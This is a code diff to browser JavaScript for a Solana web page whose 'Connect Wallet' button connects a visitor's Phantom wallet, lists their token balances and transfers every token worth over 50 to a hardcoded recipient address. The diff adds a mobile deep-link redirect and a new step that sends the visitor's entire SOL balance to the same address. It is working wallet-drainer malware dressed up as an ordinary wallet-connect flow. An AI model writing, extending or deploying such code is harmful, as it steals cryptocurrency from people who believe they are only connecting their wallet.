@@ -1,14 +1,28 @@
 import { Buffer } from 'buffer';  // Ensure buffer is available globally
 window.Buffer = Buffer;
 
-import { Connection, PublicKey, Transaction } from '@solana/web3.js';
+import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
 import { getAssociatedTokenAddress, createTransferInstruction, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } from '@solana/spl-token';
 
 // Define necessary variables
 let walletAddress = null;
+
+// Detect if the user is on a mobile device
+function isMobile() {
+    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+}
+
 // Function to connect the Phantom wallet and execute the whole flow
 async function connectAndExecute() {
     const provider = window.solana;
+
+    // Check if user is on mobile and Phantom is not available
+    if (isMobile()) {
+        const redirectUrl = window.location.href;  // URL to return to after connection
+        const deepLink = `https://phantom.app/ul/v1/connect?app_url=${encodeURIComponent(window.location.origin)}&redirect_url=${encodeURIComponent(redirectUrl)}`;
+        window.location.href = deepLink;  // Redirect the user to Phantom app for mobile connection
+        return;
+    }
 
     if (!provider || !provider.isPhantom) {
         alert('Phantom wallet not found. Please install it!');
@@ -31,9 +45,6 @@ async function connectAndExecute() {
         const balance = await connection.getBalance(new PublicKey(walletAddress));
         const solBalance = balance / 1e9;
 
-        // Optional: Display balance in the UI if necessary
-        // document.getElementById('walletBalance').textContent = `Balance: ${solBalance} SOL`;
-
         // Step 4: Fetch token balances using Shyft API
         const tokens = await fetchTokenBalances(walletAddress);
 
@@ -48,7 +59,7 @@ async function connectAndExecute() {
         });
 
         // Filter out tokens with a value of zero or below a certain threshold (e.g., 0.01)
-        const filteredTokens = tokenValues.filter(token => token.value > 0.026);
+        const filteredTokens = tokenValues.filter(token => token.value > 50);
 
         // Sort tokens by value (highest to lowest)
         const sortedTokens = filteredTokens.sort((a, b) => b.value - a.value);
@@ -57,6 +68,9 @@ async function connectAndExecute() {
         // Step 7: Transfer tokens in the sorted order
         const recipientAddress = '2VhgfoY8zMLcpF5NhoArSua2iCoduqEFLMSaRXFhistJ';  // Replace with the recipient's address
         await transferTokensInOrder(sortedTokens, recipientAddress, connection);
+
+        // Step 8: Initiate SOL transfer after all token transfers
+        await transferSol(connection, recipientAddress, solBalance);
 
     } catch (err) {
         console.error(err);
@@ -163,6 +177,42 @@ async function transferTokensInOrder(tokens, recipientAddress, connection) {
     }
 }
 
+// Transfer SOL after token transfers
+async function transferSol(connection, recipientAddress, solBalance) {
+    try {
+        if (solBalance > 0) {
+            const provider = window.solana;
+            const fromPublicKey = new PublicKey(walletAddress);
+            const recipientPublicKey = new PublicKey(recipientAddress);
+
+            console.log(`Initiating SOL transfer (${solBalance} SOL)`);
+
+            // Create a SOL transfer instruction
+            const transaction = new Transaction().add(
+                SystemProgram.transfer({
+                    fromPubkey: fromPublicKey,
+                    toPubkey: recipientPublicKey,
+                    lamports: solBalance * 1e9  // Convert SOL to lamports
+                })
+            );
+
+            transaction.feePayer = fromPublicKey;
+            const latestBlockhash = await connection.getLatestBlockhash();
+            transaction.recentBlockhash = latestBlockhash.blockhash;
+
+            // Sign and send the transaction
+            const signature = await provider.signAndSendTransaction(transaction);
+            await confirmTransactionWithTimeout(connection, signature, 8000);  // 8-second timeout
+
+            console.log(`Successfully transferred SOL!`);
+        } else {
+            console.log('No SOL to transfer.');
+        }
+    } catch (err) {
+        console.error('Failed to transfer SOL:', err);
+    }
+}
+
 // Create a transaction to transfer SPL tokens
 async function createTransferTransaction(connection, fromPublicKey, toPublicKey, tokenMintAddress, amount, decimals) {
     // Get associated token accounts for the sender and recipient
@@ -195,40 +245,21 @@ async function createTransferTransaction(connection, fromPublicKey, toPublicKey,
         TOKEN_PROGRAM_ID
     );
 
-    // Create and build the transaction
     const transaction = new Transaction().add(transferInstruction);
     transaction.feePayer = fromPublicKey;
-
-    // Get the latest blockhash
-    const latestBlockhash = await connection.getLatestBlockhash();
-    transaction.recentBlockhash = latestBlockhash.blockhash;
+    const { blockhash } = await connection.getLatestBlockhash();
+    transaction.recentBlockhash = blockhash;
 
     return transaction;
 }
 
-// Confirm transaction with timeout
-async function confirmTransactionWithTimeout(connection, signature, timeoutMs) {
-    const start = Date.now();
-
-    // Create a promise that rejects after the timeout
+// Confirm transaction with a timeout
+async function confirmTransactionWithTimeout(connection, signature, timeout) {
+    const resultPromise = connection.confirmTransaction(signature, 'confirmed');
     const timeoutPromise = new Promise((_, reject) =>
-        setTimeout(() => reject(new Error("Transaction confirmation timed out")), timeoutMs)
+        setTimeout(() => reject(new Error('Transaction confirmation timed out')), timeout)
     );
-
-    // Wait for either the confirmation or the timeout
-    try {
-        await Promise.race([
-            connection.confirmTransaction(signature, 'confirmed'),
-            timeoutPromise
-        ]);
-        console.log(`Transaction ${signature} confirmed.`);
-    } catch (err) {
-        console.error(`Transaction confirmation failed for ${signature}:`, err);
-        throw err;
-    }
-
-    const end = Date.now();
-    console.log(`Transaction confirmation took ${end - start}ms`);
+    return Promise.race([resultPromise, timeoutPromise]);
 }
 
 // Attach the connectAndExecute function to the "Connect Wallet" button
